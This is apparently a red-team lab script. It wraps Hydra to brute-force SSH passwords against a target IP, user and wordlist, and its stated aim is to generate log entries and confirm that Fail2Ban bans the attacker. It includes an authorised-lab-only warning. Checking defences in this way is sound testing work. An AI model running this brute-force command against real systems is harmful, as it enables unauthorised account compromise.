#!/usr/bin/env bash
#
# Role: RED TEAM
# Purpose:
#   Demonstrate SSH brute-force attempts using Hydra in a controlled lab environment
#   to generate logs and validate Fail2Ban response.
#
# WARNING:
#   Only use this script against lab systems that you own or are explicitly
#   authorized to test. Do NOT use against production or external systems.
#
# Usage:
#   ./scripts/ssh_bruteforce_test.sh <TARGET_IP> <USERNAME> <WORDLIST>
#
# Examples:
#   ./scripts/ssh_bruteforce_test.sh 192.168.50.245 secadmin ./wordlist.txt
#   ./scripts/ssh_bruteforce_test.sh 192.168.50.245 secadmin /usr/share/wordlists/rockyou.txt
#

set -euo pipefail

if [[ $# -lt 3 ]]; then
  echo "Usage: $0 <TARGET_IP> <USERNAME> <WORDLIST>"
  exit 1
fi

TARGET="$1"
USERNAME="$2"
WORDLIST="$3"

if ! command -v hydra >/dev/null 2>&1; then
  echo "[!] hydra is not installed."
  echo "    Install (Debian/Kali): sudo apt install -y hydra"
  exit 1
fi

if [[ ! -f "${WORDLIST}" ]]; then
  echo "[!] Wordlist not found: ${WORDLIST}"
  echo "    Tip: Use a repo-local demo list, e.g. ./wordlist.txt"
  exit 1
fi

echo "[*] Launching Hydra SSH brute-force against ${TARGET} for user ${USERNAME}"
echo "    This is intended to generate auth.log entries and trigger Fail2Ban."
echo "    (Lab only. Expect a ban if fail2ban is active.)"

# -t controls parallelism; keep modest to avoid immediate server-side throttling noise
hydra -l "${USERNAME}" -P "${WORDLIST}" ssh://"${TARGET}" -t 2 -V

echo "[+] Hydra run complete."
echo "    On the target: sudo fail2ban-client status sshd"
